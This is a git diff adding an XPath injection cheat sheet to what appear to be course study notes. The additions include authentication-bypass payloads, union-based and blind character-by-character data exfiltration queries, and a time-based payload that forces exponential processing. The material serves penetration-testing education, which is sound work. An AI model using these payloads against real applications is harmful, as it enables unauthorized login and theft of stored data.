@@ -4,6 +4,8 @@
     - [Nodes](#nodes)
     - [Predicates](#predicates)
     - [Wildcards & Union](#wildcards--union)
+- [Cheat Sheet](#cheat-sheet)
+  - [Authentication Bypass](#authentication-bypass)
 
 
 
@@ -123,4 +125,44 @@
 |:----|:-----------|
 |`//module[tier=2]/title/text() \| //module[tier=3]/title/text()`| 	Select the title of all modules in tiers 2 and 3|
 
-## Authentication Bypass
+## Cheat Sheet
+
+### Authentication Bypass
+
+|Description| 	Username| 	Query|
+|:----------|:----------|:-------|
+|Regular Authentication| 	htb-stdnt| 	`/users/user[username/text()='htb-stdnt' and password/text()='295362c2618a05ba3899904a6a3f5bc0']`|
+|Bypass Authentication with known username| 	`admin' or '1'='1`| 	`/users/user[username/text()='admin' or '1'='1' and password/text()='21232f297a57a5a743894a0e4a801fc3']`|
+|Bypass Authentication by position| 	`' or position()=1 or '`| 	`/users/user[username/text()='' or position()=1 or '' and password/text()='21232f297a57a5a743894a0e4a801fc3']`|
+|Bypass Authentication by substring| 	`' or contains(.,'admin') or '`| 	`/users/user[username/text()='' or contains(.,'admin') or '' and password/text()='21232f297a57a5a743894a0e4a801fc3']`|
+
+## Data Exfiltration
+
+- Unrestricted:
+  - Leak entire XML document via union injection: `| //text()`
+
+- Restricted:
+  - Determine schema depth via chain of wildcards `/*[1]`
+  - iterate through XML schema by increasing the indices to exfiltrate the entire document step-by-step
+
+Blind Data Exfiltration
+
+Description 	Payload 	Query
+Exfiltrating Node Name's Length 	invalid' or string-length(name(/*[1]))=1 and '1'='1 	/users/user[username='invalid' or string-length(name(/*[1]))=1 and '1'='1']
+Exfiltrating Node Name 	invalid' or substring(name(/*[1]),1,1)='a' and '1'='1 	/users/user[username='invalid' or substring(name(/*[1]),1,1)='a' and '1'='1']
+Exfiltrating Number of Child Nodes 	invalid' or count(/*[1]/*)=1 and '1'='1 	/users/user[username='invalid' or count(/*[1]/*)=1 and '1'='1']
+Exfiltrating Value Length 	invalid' or string-length(/users/user[1]/username)=1 and '1'='1 	/users/user[username='invalid' or string-length(/users/user[1]/username)=1 and '1'='1']
+Exfiltrating Value 	invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1 	/users/user[username='invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1']
+Time-based
+
+Force the web application to iterate over the entire XML document exponentially:
+Code: xpath
+
+count((//.)[count((//.))])
+
+Determine whether the first letter of the "username" is "a" based on the time it takes: if it is, the query will utilize a significant processing time, otherwise, it won't.
+Code: xpath
+
+invalid' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1
+
+- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
